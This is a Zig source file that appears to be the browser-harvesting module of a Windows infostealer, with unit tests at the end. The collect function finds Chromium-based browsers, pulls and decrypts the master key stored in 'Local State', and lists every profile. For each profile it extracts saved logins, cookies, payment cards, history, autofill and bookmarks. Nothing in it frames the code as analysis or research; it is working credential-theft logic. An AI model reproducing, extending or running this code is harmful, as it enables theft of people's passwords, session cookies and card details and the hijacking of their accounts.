const std = @import("std");
const chromium_paths = @import("chromium_paths.zig");
const chrome_key = @import("../crypto/chrome_key.zig");
const chrome_crypto = @import("../crypto/chrome_crypto.zig");
const chromium_login = @import("chromium_login.zig");
const chromium_cookies = @import("chromium_cookies.zig");
const chromium_cards = @import("chromium_cards.zig");
const chromium_history = @import("chromium_history.zig");
const chromium_autofill = @import("chromium_autofill.zig");
const chromium_bookmarks = @import("chromium_bookmarks.zig");
const file_io = @import("../parsers/file_io.zig");

pub const BrowserData = struct {
    browser_name: []const u8,
    profile_name: []const u8,
    logins: [][]const u8,
    cookies: [][]const u8,
    cards: [][]const u8,
    history: [][]const u8,
    autofill: [][]const u8,
    bookmarks: [][]const u8,
};

pub const CollectResult = struct {
    data: []const BrowserData,
    count: usize,
};

fn freeBrowserData(bd: BrowserData, allocator: std.mem.Allocator) void {
    allocator.free(bd.browser_name);
    allocator.free(bd.profile_name);
    for (bd.logins) |s| allocator.free(s);
    allocator.free(bd.logins);
    for (bd.cookies) |s| allocator.free(s);
    allocator.free(bd.cookies);
    for (bd.cards) |s| allocator.free(s);
    allocator.free(bd.cards);
    for (bd.history) |s| allocator.free(s);
    allocator.free(bd.history);
    for (bd.autofill) |s| allocator.free(s);
    allocator.free(bd.autofill);
    for (bd.bookmarks) |s| allocator.free(s);
    allocator.free(bd.bookmarks);
}

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn findProfileDirs(allocator: std.mem.Allocator, base_path: []const u8) ![][]const u8 {
    var profiles = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (profiles.items) |p| allocator.free(p);
        profiles.deinit();
    }

    const default_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, "Default" });
    if (dirExists(default_path)) {
        try profiles.append(default_path);
    } else {
        allocator.free(default_path);
    }

    var i: usize = 1;
    while (true) : (i += 1) {
        const profile_name = try std.fmt.allocPrint(allocator, "Profile {d}", .{i});
        const profile_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, profile_name });
        allocator.free(profile_name);
        if (dirExists(profile_path)) {
            try profiles.append(profile_path);
        } else {
            allocator.free(profile_path);
            break;
        }
    }

    return profiles.toOwnedSlice();
}

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming_app_data: []const u8) !CollectResult {
    const browsers = chromium_paths.getChromiumBrowsers();
    var browser_datas = std.ArrayList(BrowserData).init(allocator);
    errdefer {
        for (browser_datas.items) |bd| freeBrowserData(bd, allocator);
        browser_datas.deinit();
    }

    for (browsers) |browser| {
        const app_data = if (browser.use_roaming) roaming_app_data else local_app_data;
        const base_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, browser.path_suffix });
        defer allocator.free(base_path);

        const local_state_path = try std.fs.path.join(allocator, &[_][]const u8{ base_path, "Local State" });
        defer allocator.free(local_state_path);

        const local_state = file_io.MappedFile.open(local_state_path) orelse continue;
        defer local_state.close();
        const json = local_state.slice();

        var b64_buf: [4096]u8 = undefined;
        const encrypted_key = chrome_key.extractEncryptedKey(json, &b64_buf) orelse continue;

        var key_buf: [256]u8 = undefined;
        const master_key_slice = chrome_crypto.decryptEncryptedKey(encrypted_key, &key_buf) orelse continue;

        var master_key: [32]u8 = undefined;
        @memset(&master_key, 0);
        const copy_len = @min(master_key_slice.len, master_key.len);
        @memcpy(master_key[0..copy_len], master_key_slice[0..copy_len]);

        const profile_dirs = findProfileDirs(allocator, base_path) catch continue;
        defer {
            for (profile_dirs) |p| allocator.free(p);
            allocator.free(profile_dirs);
        }

        for (profile_dirs) |profile_path| {
            const profile_name = try allocator.dupe(u8, std.fs.path.basename(profile_path));

            const logins = chromium_login.extractData(profile_path, allocator, master_key);
            const cookies = chromium_cookies.extractData(profile_path, allocator, master_key);
            const cards = chromium_cards.extractData(profile_path, allocator, master_key);
            const history = chromium_history.extractData(profile_path, allocator);
            const autofill = chromium_autofill.extractData(profile_path, allocator);
            const bookmarks = chromium_bookmarks.extractData(profile_path, allocator);

            try browser_datas.append(BrowserData{
                .browser_name = try allocator.dupe(u8, browser.name),
                .profile_name = profile_name,
                .logins = logins orelse try allocator.alloc([]const u8, 0),
                .cookies = cookies orelse try allocator.alloc([]const u8, 0),
                .cards = cards orelse try allocator.alloc([]const u8, 0),
                .history = history orelse try allocator.alloc([]const u8, 0),
                .autofill = autofill orelse try allocator.alloc([]const u8, 0),
                .bookmarks = bookmarks orelse try allocator.alloc([]const u8, 0),
            });
        }
    }

    return CollectResult{
        .data = try browser_datas.toOwnedSlice(),
        .count = browser_datas.items.len,
    };
}

test "collect returns empty result for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer {
        for (result.data) |bd| freeBrowserData(bd, std.testing.allocator);
        std.testing.allocator.free(result.data);
    }
    try std.testing.expectEqual(@as(usize, 0), result.count);
}

test "dirExists returns false for nonexistent path" {
    try std.testing.expect(!dirExists("C:\\__nonexistent__dir__"));
}

test "BrowserData empty slices are valid" {
    const bd = BrowserData{
        .browser_name = "",
        .profile_name = "",
        .logins = &[_][]const u8{},
        .cookies = &[_][]const u8{},
        .cards = &[_][]const u8{},
        .history = &[_][]const u8{},
        .autofill = &[_][]const u8{},
        .bookmarks = &[_][]const u8{},
    };
    try std.testing.expectEqual(@as(usize, 0), bd.logins.len);
}
